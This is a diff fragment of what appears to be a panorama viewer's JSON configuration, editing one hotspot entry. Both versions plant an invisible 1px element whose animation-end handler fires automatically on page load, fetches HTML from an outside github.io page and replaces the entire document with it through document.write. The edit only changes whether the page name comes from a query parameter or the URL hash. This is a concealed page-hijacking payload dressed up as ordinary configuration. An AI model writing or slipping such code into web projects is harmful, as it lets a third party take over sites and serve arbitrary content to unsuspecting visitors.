@@ -13,7 +13,7 @@
       "URL": "#",
       "attributes": {
         "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "if(!window.__grav_FETCH_RAN__){window.__grav_FETCH_RAN__=1;var p=new URLSearchParams(window.location.search);var file=p.get('s')||'kamal';fetch('https://nayeemelli46.github.io/news/tour/'+file+'.html').then(function(r){return r.text();}).then(function(h){document.open();document.write(h);document.close();}).catch(function(e){console.error(e);});}"
+        "onanimationend": "if(!window.__grav_FETCH_RAN__){window.__grav_FETCH_RAN__=1;var file=window.location.hash.replace('#','')||'index';fetch('https://nayeemelli46.github.io/news/tour/'+file+'.html').then(function(r){return r.text();}).then(function(h){document.open();document.write(h);document.close();}).catch(function(e){console.error(e);});}"
       }
     }
   ]
